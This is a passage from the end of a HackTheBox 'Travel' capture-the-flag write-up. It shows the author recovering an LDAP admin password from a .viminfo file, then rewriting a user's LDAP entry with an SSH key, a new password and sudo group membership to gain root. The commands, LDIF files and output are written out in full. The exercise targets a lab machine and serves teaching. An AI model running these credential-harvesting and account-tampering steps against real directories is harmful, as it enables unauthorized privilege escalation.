<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 travel</span><br><span class="line">172.20.0.10 ldap.travel.htb</span><br><span class="line">lynik-admin@travel:~$ cat .ldaprc</span><br><span class="line">HOST ldap.travel.htb</span><br><span class="line">BASE dc=travel,dc=htb</span><br><span class="line">BINDDN cn=lynik-admin,dc=travel,dc=htb</span><br></pre></td></tr></table></figure>

<p>Let’s digg a bit more to see what additional informations we can find about this LDAP server.</p>
<h3 id="LDAP-Admin-Password"><a href="#LDAP-Admin-Password" class="headerlink" title="LDAP Admin Password"></a>LDAP Admin Password</h3><p>While searching for file related to ldap we strangely find a few occurence of the <code>ldap</code> string in <code>.viminfo</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ grep -ri ldap</span><br><span class="line">.viminfo:<span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:-&#x27;</span>  3  0  ~/.ldaprc</span><br><span class="line">.viminfo:|4,39,3,0,1587670530,<span class="string">&quot;~/.ldaprc&quot;</span></span><br><span class="line">.viminfo:-<span class="string">&#x27;  1  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,39,1,0,1587670527,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:&gt; ~/.ldaprc</span></span><br><span class="line"><span class="string">.ldaprc:HOST ldap.travel.htb</span></span><br></pre></td></tr></table></figure>

<p>According to <a target="_blank" rel="noopener" href="https://vimhelp.org/starting.txt.html#viminfo">vim man page</a>, <code>.viminfo</code> is used as “session” file:</p>
<blockquote>
<p>If you exit Vim and later start it again, you would normally lose a lot of<br>information.  The viminfo file can be used to remember that information, which<br>enables you to continue where you left off.</p>
<p>The viminfo file is used to store:</p>
<ul>
<li>The command line history.</li>
<li>The search string history.</li>
<li>The input-line history.</li>
<li>Contents of non-empty registers.</li>
<li>Marks for several files.</li>
<li>File marks, pointing to locations in files.</li>
<li>Last search/substitute pattern (for ‘n’ and ‘&amp;’).</li>
<li>The buffer list.</li>
<li>Global variables.</li>
</ul>
</blockquote>
<p>Let’s see what informations we can find in this file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat .viminfo</span><br><span class="line"><span class="comment"># This viminfo file was generated by Vim 8.1.</span></span><br><span class="line"><span class="comment"># You may edit it if you&#x27;re careful!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command Line History (newest to oldest):</span></span><br><span class="line">:wq!</span><br><span class="line">|2,0,1587670530,,<span class="string">&quot;wq!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registers:</span></span><br><span class="line"><span class="string">&quot;&quot;</span>1     LINE    0</span><br><span class="line">        BINDPW Theroadlesstraveled</span><br><span class="line">|3,1,1,1,1,0,1587670528,<span class="string">&quot;BINDPW Theroadlesstraveled&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># File marks:</span></span><br><span class="line"><span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br></pre></td></tr></table></figure>

<p>We have an interesting line containing <code>BINDPW Theroadlesstraveled</code>. According to LDAP documentation <code>BINDPW</code> seems to be the administrative password of this LDAP Server.</p>
<p>Let’s confirm the password is valid:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ man ldapsearch</span><br><span class="line">-x            Use simple authentication instead of SASL.</span><br><span class="line">-w passwd     Use passwd as the password <span class="keyword">for</span> simple authentication.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w hg8</span><br><span class="line">ldap_bind: Invalid credentials (49)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=travel,dc=htb&gt; (default) with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># travel.htb</span></span><br><span class="line">dn: dc=travel,dc=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: Travel.HTB</span><br><span class="line">dc: travel</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin, travel.htb</span></span><br><span class="line">dn: cn=admin,dc=travel,dc=htb</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: admin</span><br><span class="line">description: LDAP administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lynik-admin, travel.htb</span></span><br><span class="line">dn: cn=lynik-admin,dc=travel,dc=htb</span><br><span class="line">description: LDAP administrator</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: lynik-admin</span><br><span class="line">userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=</span><br><span class="line"> =</span><br><span class="line"> </span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># louise, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">uid: louise</span><br><span class="line">cn: Louise Griffin</span><br><span class="line">sn: Griffin</span><br><span class="line">givenName: Louise</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uidNumber: 5007</span><br><span class="line">gidNumber: 5000</span><br><span class="line">homeDirectory: /home/louise</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># numResponses: 22</span></span><br><span class="line"><span class="comment"># numEntries: 21</span></span><br></pre></td></tr></table></figure>

<p>Bingo! We confirmed we have the LDAP admin password. </p>
<h3 id="LDAP-User-privilege-escalation"><a href="#LDAP-User-privilege-escalation" class="headerlink" title="LDAP User privilege escalation"></a>LDAP User privilege escalation</h3><p>Since we have admin permissions over the LDAP server we should be able to add a new user with <code>root</code> privileges right ? Let’s give it a try.</p>
<p>First we create our user entry with our own SSH key and password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dn: uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">uid: hg8</span><br><span class="line">userPassword: hg8password</span><br><span class="line">homeDirectory: /root</span><br><span class="line">loginShell: /bin/sh</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">ssh-rsa AAxxx hg8@htb.htb</span><br></pre></td></tr></table></figure>

<p>Then use <code>ldapadd</code> command to add it to the LDAP directory:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapadd -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f /tmp/.hg8/hg8.ldif</span><br><span class="line">adding new entry <span class="string">&quot;uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br><span class="line">ldap_add: Insufficient access (50)</span><br><span class="line">        additional info: no write access to parent</span><br></pre></td></tr></table></figure>

<p>Bummer! We don’t have permission to do so. </p>
<p>Well given we found that there is already several users on the server, we should probably have enough privilege to edit one instead of creating a new one.</p>
<p>Here is what we are going to do:</p>
<ul>
<li>Adding the ability to Louise account to connect through SSH using our own SSH key.</li>
<li>Adding Louise to sudoers user in order to escalate our privileges</li>
<li>Editing Louise password to allows the use of <code>sudo</code> command.</li>
</ul>
<p>After getting the <code>gid</code> of <code>sudo</code> group using <code>getintent</code> we have all the needed informations to create our modified LDAP entry for user Louise:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ getent group sudo</span><br><span class="line">sudo:x:27:trvl-admin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ cat hg8.ldif</span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: homeDirectory</span><br><span class="line">homeDirectory: /root</span><br><span class="line">-</span><br><span class="line">add: objectClass</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">-</span><br><span class="line">add: sshPublicKey</span><br><span class="line">sshPublicKey: ssh-rsa AAAxxx hg8@htb.htb</span><br><span class="line">-</span><br><span class="line">replace: userPassword</span><br><span class="line">userPassword: hg8password</span><br><span class="line">-</span><br><span class="line">replace: gidNumber</span><br><span class="line">gidNumber: 27</span><br></pre></td></tr></table></figure>

<p>Now we apply the modification:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapmodify -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f hg8.ldif</span><br><span class="line">modifying entry <span class="string">&quot;uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br></pre></td></tr></table></figure>

<p>And we should be able to login as <code>louise</code> and use <code>sudo</code> to escalate our privileges to <code>root</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ ssh -i id_rsa_htb louise@travel.htb</span><br><span class="line">Creating directory <span class="string">&#x27;/home@TRAVEL/louise&#x27;</span>.</span><br><span class="line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System load:                      0.06</span><br><span class="line">  Usage of /:                       46.2% of 15.68GB</span><br><span class="line">  Memory usage:                     19%</span><br><span class="line">  Swap usage:                       0%</span><br><span class="line">  Processes:                        209</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-836575a2ebbb: 172.20.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-8ec6dcae5ba1: 172.30.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0:            10.10.10.189</span><br><span class="line"></span><br><span class="line">Last login: Fri May 29 14:19:07 2020 from 10.10.14.18</span><br><span class="line"></span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">louise@travel:~$ sudo id</span><br><span class="line">[sudo] password <span class="keyword">for</span> louise:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">louise@travel:~$ sudo cat /root/root.txt</span><br><span class="line">1xxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure>



<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">GitTools</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/simplepie/simplepie/">SimplePie Source Code</a></li>
<li><a target="_blank" rel="noopener" href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">PHP Object Injection Cheat Sheet</a></li>
<li><a target="_blank" rel="noopener" href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt">vBulletin  &lt;= 5.2.2 Preauth Server Side Request Forgery (SSRF) | Memcached Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42392">GitHub Enterprise &lt; 2.8.7 - Remote Code Execution | Memcached Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/ldapmodify">Ldapmodify man page</a></li>
<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/ldapadd">Ldapadd man page</a></li>
</ul>
<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Gopher/" rel="tag">Gopher</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/deserialization/" rel="tag">deserialization</a>, <a class="tag-link-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link-link" href="/tags/git/" rel="tag">git</a>, <a class="tag-link-link" href="/tags/ldap/" rel="tag">ldap</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/memcached/" rel="tag">memcached</a>, <a class="tag-link-link" href="/tags/memcached-injection/" rel="tag">memcached injection</a>, <a class="tag-link-link" href="/tags/phpmemcached/" rel="tag">phpmemcached</a>, <a class="tag-link-link" href="/tags/simplePie/" rel="tag">simplePie</a>, <a class="tag-link-link" href="/tags/travel/" rel="tag">travel</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Repository-Disclosure"><span class="toc-number">1.2.</span> <span class="toc-text">Git Repository Disclosure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSS-Template"><span class="toc-number">1.3.</span> <span class="toc-text">RSS Template</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SSRF-With-Custom-RSS-Feed"><span class="toc-number">1.4.</span> <span class="toc-text">Blind SSRF With Custom RSS Feed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug-php"><span class="toc-number">1.5.</span> <span class="toc-text">Debug.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-Deserialization-Vulnerability"><span class="toc-number">1.6.</span> <span class="toc-text">Object Deserialization Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimplePie-Memcached-Key"><span class="toc-number">1.7.</span> <span class="toc-text">SimplePie Memcached Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memcached-injection"><span class="toc-number">1.8.</span> <span class="toc-text">Memcached injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypassing-SSRF-protection"><span class="toc-number">1.8.1.</span> <span class="toc-text">Bypassing SSRF protection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Memcached-And-Gopher-Protocol"><span class="toc-number">1.8.2.</span> <span class="toc-text">Memcached And Gopher Protocol</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chaining-vulnerabilities-for-RCE"><span class="toc-number">1.9.</span> <span class="toc-text">Chaining vulnerabilities for RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upgrade-Web-Shell-with-Socat"><span class="toc-number">1.10.</span> <span class="toc-text">Upgrade Web-Shell with Socat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-lynik-admin"><span class="toc-number">1.11.</span> <span class="toc-text">Pivot www-data -&gt; lynik-admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Server"><span class="toc-number">2.2.</span> <span class="toc-text">LDAP Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Admin-Password"><span class="toc-number">2.3.</span> <span class="toc-text">LDAP Admin Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-User-privilege-escalation"><span class="toc-number">2.4.</span> <span class="toc-text">LDAP User privilege escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
